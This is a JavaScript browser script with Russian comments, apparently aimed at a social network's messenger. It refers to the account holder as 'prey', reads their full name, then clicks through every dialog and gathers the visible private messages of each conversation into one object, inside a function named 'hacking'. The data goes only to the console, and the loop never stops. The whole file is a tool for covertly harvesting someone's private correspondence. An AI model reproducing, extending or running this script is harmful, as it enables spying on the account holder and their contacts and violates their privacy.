// dialogs = {
// 'Илья Ревиков': {
//     'Олег Олегрович' : ['div', 'div'],
//     ...
// }
// }

/**
 * останавливает код на ms секунд, чтобы скрипт успел выполниться
 * @param {wait time} ms 
 */
const wait = async (ms) => await new Promise(resolve => setTimeout(resolve, ms));

// =============== PREY FULL NAME =============== //
/**
 * Получает кнопку "Моя страница" и нажимает на нее, чтобы перейти в профиль
 */
function toProfile() {
    document.querySelector('#l_pr a').click();
}
/**
 * Получает имя и фамилию на странице с профилем
 */
function getPreyFullName() {
    return document.querySelector('.page_name').textContent.trim();
}
// =============== PREY FULL NAME =============== //


/**
 * Получает ссылку "Мессенджер" и нажимает на неё, чтобы перейти в сообщения
 */
function toMessages() {
    document.querySelector('#l_msg a').click();
}

/**
 * Проходится по всем диалогам в панели слева и получает их id
 */
function getDialogsIDs() {
    let dialogs = [];

    document.querySelectorAll('.nim-dialog').forEach(link => {
        dialogs.push({
            'list-id': link.getAttribute('data-list-id'),
            'msgid': link.getAttribute('data-msgid'),
        });
    });

    return dialogs;
}

/**
 * По ID получает диалог из левого сайд бара и кликает по нему, чтобы переместиться на страницу с этим диалогом
 */
function goToDialog(list_id) {
    document.querySelector(`._im_dialog_${list_id}`).click();
}

/**
 * Получает имя собеседника на текущей странице
 */
function getFriendName() {
    return document.querySelector('._im_page_peer_name').textContent.trim();
}

/**
 * Получает все видимые сообщения на этой странице
 */
function getMessages() {
    let messages = [];
    document.querySelectorAll('.im-mess--text').forEach(mess =>
        messages.push(mess)
    );
    return messages;
}

// ======================== //
// ===== IT IS MAGICK ===== //
async function hacking() {
    // ===== GET PREY's FULLNAME ===== //
    toProfile(); // go to profile
    await wait(2000); // wait some time
    let preyName = getPreyFullName(); // get full name
    // ===== GET PREY's FULLNAME ===== //


    // ===== GO TO MESSAGES Page ===== //
    toMessages();
    await wait(2000); // wait some time
    // ===== GO TO MESSAGES Page ===== //


    // инициализируем объект с полученными данными
    let dialogsData = {
        [preyName]: {}
    }
    // инициализируем объект с полученными данными


    let dialogsIds = getDialogsIDs(); // получаем id диалогов, чтобы можно было по ним пройтись циклом
    let dialogsCount = dialogsIds.length; // кол-во диалогов
    let i = 0; // номер текущего диалога в массиве id

    // ===== PARSE DIALOGS ===== //
    let parser = setInterval(() => {
        // data is end
        if (!dialogsIds) return;
        if (!dialogsIds[i]) return;

        // переходим к следующиму диалогу
        goToDialog(dialogsIds[i]['list-id']);

        // получаем имя собеседника
        let friendName = getFriendName();

        // добавляем сообщения с этой страницы в объект по имени
        dialogsData[preyName][friendName] = getMessages();

        console.log(dialogsData);

        i++; // увеличиваем i, чтобы перейти к след. диалогу
    }, 2000);
}